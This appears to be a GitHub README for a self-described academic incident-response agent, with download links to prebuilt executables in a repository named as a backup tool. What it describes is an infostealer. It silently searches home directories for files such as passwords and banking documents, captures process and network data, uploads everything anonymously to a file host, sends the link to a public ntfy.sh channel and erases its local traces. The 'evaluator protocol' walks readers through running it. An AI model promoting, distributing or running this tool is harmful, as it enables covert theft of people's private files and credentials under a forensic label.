# Autonomous Digital Forensic Evidence Collector (DFIR-Agent)

An automated, cross-platform Incident Response (IR) triage tool developed as an academic project. This agent autonomously identifies high-value artifacts on a target host, captures volatile system states, applies military-grade cryptographic sealing, and securely exfiltrates the package to an external cloud server via out-of-band alerting.

---

# Cross-Platform Standalone Executables

Click below to download the pre-compiled agent for your target architecture. No local dependencies or runtimes are required.

<a href="https://github.com/rohangupta2/PC-Auto-Backup-Tool/raw/main/extractFiles-win.exe">
  <img src="https://img.shields.io/badge/DOWNLOAD_FOR_WINDOWS-extractFiles--win.exe-blue?style=for-the-badge&logo=windows" />
</a>

<a href="https://github.com/rohangupta2/PC-Auto-Backup-Tool/raw/main/extractFiles-macos">
  <img src="https://img.shields.io/badge/DOWNLOAD_FOR_MAC-extractFiles--macos-black?style=for-the-badge&logo=apple" />
</a>

<a href="https://github.com/rohangupta2/PC-Auto-Backup-Tool/raw/main/extractFiles-linux">
  <img src="https://img.shields.io/badge/DOWNLOAD_FOR_LINUX-extractFiles--linux-yellow?style=for-the-badge&logo=linux" />
</a>

---

# System Architecture & Execution Flow

When executed on a target machine, the agent operates through 6 distinct automated phases:

1. **Heuristic Reconnaissance:** Recursively scans the user's home directory. Files are scored based on keyword matching (e.g., *passwords, banking, resumes*), file extension weights, and recent modification/access timestamps.
2. **Volatile Data Capture:** Executes native OS commands (`tasklist` / `ps`, `netstat`) to dump live running processes and active network connections into text artifacts.
3. **Staging & Packaging:** Isolates the top-scoring files and volatile logs into a temporary staging directory and compresses them into a `.zip` archive.
4. **Cryptographic Sealing:** Encrypts the archive using `AES-256-CBC` with a dynamically generated salt/Initialization Vector (IV). 
5. **Anonymous Exfiltration:** Uploads the encrypted payload (`.enc`) to a secure GoFile cloud cluster via multi-part REST API.
6. **Out-of-Band (OOB) Alerting & Sanitization:** Dispatches the retrieval URL to a designated `ntfy.sh` webhook. Immediately wipes all local staging directories and leftover encrypted files to ensure zero local footprint.

---

# Evaluator's Testing Protocol

To verify the functionality of this project safely across separate machines, evaluators can follow this standard live-test protocol:

### Method A: Quick Live Evaluation (Recommended)

1. **Setup the Command Center:** On your smartphone or evaluation PC, open any web browser and navigate to:  
   **`https://ntfy.sh/shinchan_007`** *(Keep this tab open. This is the designated OOB alert channel).*

2. **Deploy the Agent:** On a separate test machine, run the downloaded binary (e.g., `extractFiles-win.exe`). The script will execute silently in the background.

3. **Intercept the Payload:** Within 15–30 seconds, a live web-push notification will trigger on your open `ntfy.sh` tab containing a secure cloud download link. Download the `.enc` file to your evaluation environment.

4. **Forensic Decryption:** Place `decrypt.js` and the downloaded `.enc` file in the same directory. Open your terminal and run:
   ```bash
   node decrypt.js